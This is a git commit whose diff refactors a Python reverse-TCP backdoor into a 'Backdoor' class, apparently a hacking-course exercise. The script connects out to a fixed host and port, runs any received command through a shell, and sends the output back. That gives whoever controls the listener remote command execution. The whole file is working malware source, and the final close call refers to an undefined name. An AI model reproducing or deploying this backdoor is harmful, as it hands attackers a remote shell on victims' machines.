d04a29c181f4004278070dba900ed52dc77a34ab
AzzDestrhoyer <fabriciososa006@gmail.com>
2022-04-22 11:37:14 -0300

    siii

--- Payload/reverse_tcp.py
+++ Payload/reverse_tcp.py
@@ -1,18 +1,22 @@
 import socket
 import subprocess
 
-def ejecutar_comando(command):
-	return subprocess.check_output(command, shell=True)
+class Backdoor:
+	def __init__(self, ip, port):
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.connection.connect((ip, port))
 
-connection = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-connection.connect (("192.168.0.207",4444))
-
-connection.send("\n [+]Conexion Establecida\n")
+	def ejecutar_comando(self, command):
+		return subprocess.check_output(command, shell=True)
 
 
-while True:
-	command = connection.recv(1024)
-	resultados_comando = ejecutar_comando(command)
-	connection.send(resultados_comando)
+	def run(self):
+		while True:
+			command = self.connection.recv(1024)
+			resultados_comando = self.ejecutar_comando(command)
+			self.connection.send(resultados_comando)
 
-connection.close()
+		connection.close()
+
+puerta = Backdoor("192.168.0.207", 4444)
+puerta.run()
